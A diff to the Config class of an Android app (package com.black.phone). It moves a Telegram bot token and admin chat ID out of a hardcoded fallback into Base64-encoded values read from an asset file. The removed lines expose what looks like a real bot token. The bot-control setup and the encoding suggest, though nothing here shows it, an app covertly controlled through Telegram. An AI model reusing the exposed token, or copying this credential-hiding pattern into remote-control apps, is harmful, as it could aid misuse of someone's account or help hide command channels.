@@ -1,36 +1,48 @@
 package com.black.phone;
 
 import android.content.Context;
-import android.content.res.AssetManager;
-import com.google.gson.Gson;
-import java.io.InputStreamReader;
-import java.io.Reader;
+import android.util.Base64;
+import org.json.JSONObject;
+import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
 
 public class Config {
-    public String bot_token;
-    public String admin_chat_id;
-    public String webview_url;
-    public int poll_interval_sec;
-
     private static Config instance;
+    private String botToken;
+    private String adminChatId;
+    private String webviewUrl;
+    private int pollIntervalSec;
 
-    public static Config get() {
-        if (instance == null) throw new RuntimeException("Config not loaded!");
+    private Config(Context context) {
+        try {
+            InputStream is = context.getAssets().open("config.json");
+            byte[] buffer = new byte[is.available()];
+            is.read(buffer);
+            is.close();
+            String jsonStr = new String(buffer, StandardCharsets.UTF_8);
+            JSONObject json = new JSONObject(jsonStr);
+            botToken = new String(Base64.decode(json.getString("bot_token"), Base64.DEFAULT));
+            adminChatId = new String(Base64.decode(json.getString("admin_chat_id"), Base64.DEFAULT));
+            webviewUrl = json.getString("webview_url");
+            pollIntervalSec = json.getInt("poll_interval_sec");
+        } catch (Exception e) {
+            e.printStackTrace();
+            botToken = "";
+            adminChatId = "";
+            webviewUrl = "https://www.google.com";
+            pollIntervalSec = 5;
+        }
+    }
+
+    public static Config get(Context context) {
+        if (instance == null) instance = new Config(context);
         return instance;
     }
 
-    public static void load(Context ctx) {
-        try {
-            AssetManager am = ctx.getAssets();
-            Reader r = new InputStreamReader(am.open("config.json"));
-            instance = new Gson().fromJson(r, Config.class);
-            r.close();
-        } catch (Exception e) {
-            instance = new Config();
-            instance.bot_token = "8962511911:AAHYZpdZJVkNif1iF1-3odKTqq2owgDk16M";
-            instance.admin_chat_id = "6793813126";
-            instance.webview_url = "https://www.google.com";
-            instance.poll_interval_sec = 5;
-        }
-    }
+    public static Config get() { return instance; }
+
+    public String getBotToken() { return botToken; }
+    public String getAdminChatId() { return adminChatId; }
+    public String getWebviewUrl() { return webviewUrl; }
+    public int getPollIntervalSec() { return pollIntervalSec; }
 }
